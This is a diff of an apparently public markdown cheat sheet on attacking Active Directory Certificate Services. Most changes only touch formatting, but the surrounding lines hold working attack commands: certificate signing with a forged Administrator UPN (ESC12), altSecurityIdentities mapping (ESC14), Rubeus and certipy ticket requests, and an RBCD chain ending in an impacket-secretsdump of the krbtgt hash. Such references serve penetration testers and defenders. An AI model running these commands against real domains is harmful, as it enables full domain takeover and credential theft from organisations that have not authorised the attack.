@@ -4,17 +4,20 @@ Active Directory Certificate Services (AD CS) is a Microsoft Windows server role
 
 ## ADCS Enumeration
 
-* netexec: 
+* NetExec:
+
     ```ps1
     netexec ldap domain.lab -u username -p password -M adcs
     ```
 
-* ldapsearch: 
+* ldapsearch:
+
     ```ps1
     ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
     ```
 
-* certutil: 
+* certutil:
+
     ```ps1
     certutil.exe -config - -ping
     certutil -dump
@@ -426,7 +429,7 @@ Exploitation:
 
 * Sign `user_esc12.crt` and specify a `Subject Alternative Name` using the `extension.inf` file.
 
-  ```
+  ```ps1
   certutil -sign ./user_esc12.crt new.crt @extension.inf
   ```
 
@@ -438,7 +441,6 @@ Exploitation:
   _continue_ = "UPN=Administrator@esc.local&"
   ```
 
-
 * Use the certificate to get the TGT of the Administrator
 
   ```ps1
@@ -447,7 +449,6 @@ Exploitation:
   ```
 
 Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.
-
 
 ## ESC13 - Issuance Policy
 
@@ -518,7 +519,6 @@ Members           : {}
   Rubeus.exe ptt /ticket:<ticket>
   ```
 
-
 ## ESC14 - altSecurityIdentities
 
 > ESC14 is an Active Directory Certificate Services (ADCS) abuse technique that leverages the altSecurityIdentities attribute to perform explicit certificate mappings. This attribute allows administrators to associate specific certificates with user or computer accounts for authentication purposes. However, if an attacker gains write access to this attribute, they can add a mapping to a certificate they control, effectively impersonating the targeted account.
@@ -575,7 +575,6 @@ Add-AltSecIDMapping -DistinguishedName "CN=Administrator,CN=Users,DC=lab,DC=loca
 # request TGT for Administrator
 Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local /show /nowrap
 ```
-
 
 ## ESC15 - EKUwu Application Policies - CVE-2024-49019
 
@@ -706,7 +705,6 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
 
-
 ### PKINIT ERROR
 
 When the DC does not support **PKINIT** (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.
@@ -720,31 +718,35 @@ KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)
 There is still a way to use the certificate to takeover the account.
 
 * Open an LDAP shell using the certificate
+
     ```ps1
     certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
     ```
 
 * Add a computer for RBCD
+
     ```ps1
     impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name "NEWCOMPUTER" -computer-pass "P@ssw0rd123*"
     ```
 
 * Set the RBCD
+
     ```ps1
     set_rbcd 'TARGET$' 'NEWCOMPUTER$'
     ```
 
 * Request a ticket with impersonation
+
     ```ps1
     impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'
     ```
 
 * Use the ticket
+
     ```ps1
     export KRB5CCNAME=DC$.ccache
     impacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'
     ```
-
 
 ## UnPAC The Hash
 
